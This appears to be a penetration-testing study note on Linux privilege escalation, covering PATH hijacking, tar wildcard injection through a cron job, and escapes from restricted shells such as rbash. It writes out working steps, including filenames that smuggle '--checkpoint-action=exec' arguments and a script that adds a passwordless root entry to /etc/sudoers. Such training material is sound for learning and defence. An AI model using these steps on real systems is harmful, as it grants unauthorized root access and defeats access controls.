## 1- PATH abuse
PATH is an environment variable listing directories where executables are located, letting users run commands without full paths. Check it with `echo $PATH` or `env | grep PATH`.
```bash
echo $PATH
#/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
**Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.**
As shown below, the `conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.
```bash
pwd && conncheck  # /usr/local/sbin 
pwd && conncheck  # tmp  
```

Adding `.` to PATH includes the current directory, allowing local files to run before system binaries. This can be abused by replacing common commands (e.g., `ls`) with malicious scripts.

```bash
echo $PATH # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

PATH=.:${PATH}
export PATH
echo $PATH # .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.
```bash
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls # PATH ABUSE!!
```
## 2- Wildcard Abuse
Wildcards are special characters expanded by the shell to match file names or paths
- `*` matches any number of characters
- `?` matches a single character
- `[ ]` matches one character from a set or range
- `~` expands to a user’s home directory
- `-` inside `[ ]` defines a character range

An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:
```bash
man tar
  # --checkpoint[=N] : Display progress messages every Nth record (default 10).
  # --checkpoint-action=ACTION : Run ACTION on each checkpoint.
```
The `--checkpoint-action` option allows `tar` to execute arbitrary commands at runtime. By abusing wildcards, attacker‑controlled filenames are passed as arguments  and executed.

This cron job archives `/home/htb-student` every minute, making it a frequent and reliable target. Its regular execution makes it a good candidate for privilege escalation.
```bash
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
The wildcard in the cron job lets us use filenames as command arguments. When the job runs, these arguments are executed, allowing arbitrary command execution.
```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
We can check and see that the necessary files were created.
```bash
ls -la
  # backup.tar.gz
  # --checkpoint=1
  # --checkpoint=1
```
Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.
```bash
 sudo -l # (root) NOPASSWD: ALL
```


---

## 3- Escaping Restricted Shells
A restricted shell limits what commands and directories a user can access to reduce risk. Common restricted shells include `rbash`, `rksh`, and `rzsh`, often used to control user actions in secure environments.
**RBASH**
`rbash` (Restricted Bourne Shell) limits actions like changing directories, modifying environment variables, and running commands outside allowed paths. It is commonly used to tightly control low-privileged users.
 **RKSH**
`rksh` (Restricted Korn Shell) restricts executing commands in other directories and modifying the shell environment. It offers slightly more flexibility than `rbash` but still enforces strong limitations.
 **RZSH**
`rzsh` (Restricted Z Shell) is a restricted form of `zsh` that prevents script execution, alias creation, and environment changes. It is the most flexible restricted shell while still enforcing controls.

Several techniques can be used to escape a restricted shell. These include exploiting shell weaknesses or using creative methods to bypass imposed limitations.
#### Escaping
In some cases, restricted shells can be bypassed through command injection. If user input is passed to built‑in commands, attackers may inject extra commands to escape the shell.

##### Command injection
in restricted shells that limit commands like `ls`, command injection can be used to bypass restrictions. By injecting another command as an argument, we can execute it indirectly.
```
ls -l `pwd`
```
Here, `pwd` is executed inside the command substitution, allowing us to run it even though it is normally blocked.
##### Command Substitution
Command substitution runs a command inside another command using backticks or `$( )`, which can bypass restrictions.  
```bash
echo `whoami` # kali
```
This executes `whoami` even if it is normally blocked by the restricted shell.
##### Command Chaining
runs multiple commands on one line using separators like `;` or `|`, which may bypass restrictions. 
```bash
ls -l; whoami # This executes `whoami` even if only `ls` is normally allowed.
```
##### Environment Variables
By modifying environment variables, a restricted shell can sometimes be bypassed. Changing variables like `PATH` may allow execution of normally restricted commands.
#### Shell Functions
Shell functions can be used to bypass restrictions if function creation is allowed. A function may execute commands that are normally blocked.  
Example:
```
f(){ whoami; }; f
```

##### Start Unrestricted Remote Shell
This command starts a remote Bash shell without loading restricted profiles, bypassing shell limitations.  
Example:
```
ssh user@10.0.0.3 -t "bash --noprofile"
```